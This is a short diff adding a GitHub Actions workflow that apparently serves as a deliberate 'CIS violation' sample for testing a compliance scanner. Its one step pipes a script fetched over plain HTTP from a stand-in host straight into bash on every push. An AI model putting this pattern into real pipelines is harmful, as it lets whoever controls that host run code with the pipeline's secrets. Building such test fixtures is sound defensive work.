@@ -1,0 +1,12 @@
+name: CIS GitHub Violation Workflow
+
+on: [push]
+
+jobs:
+  insecure-job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+      - name: Run unreviewed code
+        run: curl http://insecure.com/script.sh | bash
